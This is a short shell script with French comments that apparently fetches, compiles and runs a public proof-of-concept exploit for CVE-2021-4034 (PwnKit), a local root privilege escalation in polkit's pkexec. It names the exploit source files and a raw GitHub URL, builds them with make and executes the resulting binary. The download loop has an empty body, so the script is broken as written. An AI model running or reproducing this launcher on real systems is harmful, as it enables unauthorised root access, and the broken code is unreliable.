#!/usr/bin/env sh

URL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main'

# Télécharger les fichiers nécessaires
for EXPLOIT in "cve-2021-4034.c" "pwnkit.c" "Makefile"
do
done

# Vérifier si les fichiers ont été téléchargés correctement
if [ ! -f "cve-2021-4034.c" ] || [ ! -f "pwnkit.c" ] || [ ! -f "Makefile" ]; then
    echo "Erreur: Échec du téléchargement d'un ou plusieurs fichiers."
    exit 1
fi

# Compiler les fichiers
make

# Vérifier si la compilation a réussi
if [ $? -eq 0 ]; then
    ./cve-2021-4034
else
    echo "Erreur: La compilation a échoué."
    exit 1
fi